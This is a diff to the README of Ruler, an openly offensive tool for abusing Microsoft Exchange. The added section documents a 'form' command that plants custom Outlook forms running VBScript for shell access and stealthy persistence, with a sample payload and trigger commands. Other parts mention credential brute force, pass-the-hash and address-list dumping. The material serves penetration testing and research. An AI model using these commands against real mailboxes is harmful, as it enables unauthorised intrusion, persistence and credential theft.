@@ -4,7 +4,7 @@ Ruler is a tool that allows you to interact with Exchange servers remotely, thro
 
 Silentbreak did a great job with this attack and it has served us well. The only downside has been that it takes time to get setup. Cloning a mailbox into a new instance of Outlook can be time consuming. And then there is all the clicking it takes to get a mailrule created. Wouldn't the command line version of this attack be great? And that is how Ruler was born.
 
-The full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog post: [SensePost blog]
+The full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog posts: [Ruler release], [Pass the Hash with Ruler], [Outlook forms and shells].
 
 For a demo of it in action: [Ruler on YouTube]
 
@@ -17,6 +17,7 @@ Ruler has multiple functions and more are planned. These include
 * Create new malicious mail rules
 * Delete mail rules
 * Dump the Global Address List (GAL)
+* VBScript execution through forms
 
 Ruler attempts to be semi-smart when it comes to interacting with Exchange and uses the Autodiscover service (just as your Outlook client would) to discover the relevant information.
 
@@ -69,13 +70,15 @@ As mentioned before there are multiple functions to Ruler. In most cases you'll 
 
 # Basic Usage
 
-Ruler has 5 basic commands, these are:
+Ruler has 8 basic commands, these are:
 
 * display -- list all the current rules
 * add -- add a rule
 * delete -- delete a rule
 * brute -- brute force credentials
 * send -- send an email to trigger the shell
+* abk -- interact with the GAL (MAPI/HTTP only)
+* form -- script execution through custom forms
 * help -- show the help screen
 
 There are a few global flags that should be used with most commands, while each command has sub-flags. For details on these, use the **help** command.
@@ -102,35 +105,6 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.
 AUTHOR:
    Etienne Stalmans <etienne@sensepost.com>, @_staaldraad
 
-COMMANDS:
-     add, a       add a new rule
-     delete, r    delete an existing rule
-     display, d   display all existing rules
-     check, c     Check if the credentials work and we can interact with the mailbox
-     send, s      Send an email to trigger an existing rule. This uses the target user's own account.
-     brute, b     Do a bruteforce attack against the autodiscover service to find valid username/passwords
-     abk          Interact with the Global Address Book
-     troopers, t  Troopers
-     help, h      Shows a list of commands or help for one command
-
-GLOBAL OPTIONS:
-   --domain value, -d value    A domain for the user (optional in most cases. Otherwise allows: domain\username)
-   --o365                      We know the target is on Office365, so authenticate directly against that.
-   --username value, -u value  A valid username
-   --password value, -p value  A valid password
-   --hash value                A NT hash for pass the hash
-   --email value, -e value     The target's email address
-   --cookie value              Any third party cookies such as SSO that are needed
-   --url value                 If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml
-   --insecure, -k              Ignore server SSL certificate errors
-   --encrypt                   Use NTLM auth on the RPC level - some environments require this
-   --basic, -b                 Force Basic authentication
-   --admin                     Login as an admin
-   --nocache                   Don't use the cached autodiscover record
-   --rpc                       Force RPC/HTTP rather than MAPI/HTTP
-   --verbose                   Be verbose and show some of thei inner workings
-   --help, -h                  show help
-   --version, -v               print the version
 ```
 
 ## Brute-force for credentials
@@ -332,7 +306,56 @@ This will display all entries on screen. Now there can be ALOT of entries, so it
 ./ruler --email user@targetdomain.com abk dump --output /tmp/gal.txt
 ```
 
+# Forms
+
+Ruler can also get shell through custom forms. This is especially useful for persistence, as a form can lie dormant in the inbox, nearly undetectable.
+
+The basic premise behind forms is explained in the [Outlook forms and shells].
+
+## Setup
+
+If you use the forms attack, you need to ensure that the **templates** folder is present in the current working directory. Ruler will need the files contained in this directory. Please copy the following files into it:
+
+* img0.bin
+* img1.bin
+* formstemplate.bin
+
+## Using forms
+
+Unlike Rules, forms don't require a WebDAV instacnce and VBScript can be executed directly. A sample VBScript entry would be:
+
+```
+CreateObject("Wscript.Shell").Run "calc.exe", 0, False
+```
+
+The script needs to be supplied in either a file, or on the command line. To create a custom form:
+
+```
+./ruler --email john@msf.com form add --suffix superduper --input /tmp/command.txt --send
+```
+
+This will create a new form, of message class _IPM.Note.superduper_ and use the script found in _/tmp/command.txt_ as the VBScript to execute. Using ```--send``` simply task Ruler to send an email to the user, using their own account, and ensuring the correct message class is set (which triggers the form).
+
+To trigger an existing form, you don't need send the email from the account that the form was created on. This is great for persistence, you simply need to have a valid Exchange based account (outlook.com is great) and know the suffix used for the form.
+
+```
+./ruler --email alice@outlook.com form send --target john@msf.com --suffix superduper
+```
+
+Deleting an existing is done in a similar way to deleting rules.
+
+```
+./ruler --email john@msf.com form delete --suffix superduper
+```
+
+# Attacking Exchange
+
+The library included with Ruler allows for the creation of custom message using MAPI. This along with the Exchnage documentation is a great starting point for new research. For an example of using this library in another project, see [SensePost Liniaal].
+
 [Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
-[SensePost blog]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>
-[Ruler on YouTube]:<https://youtu.be/C07GS4M8BZk>
+[Ruler Release]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>
+[Pass the hash with Ruler]: <https://sensepost.com/blog/2017/pass-the-hash-with-ruler/>
+[Outlook forms and shells]: <https://sensepost.com/blog/2017/outlook-forms-and-shells/>
+[Ruler on YouTube]:<https://www.youtube.com/watch?v=C07GS4M8BZk>
 [Releases]: <https://github.com/sensepost/ruler/releases>
+[SensePost Liniaal]:<https://github.com/sensepost/liniaal>
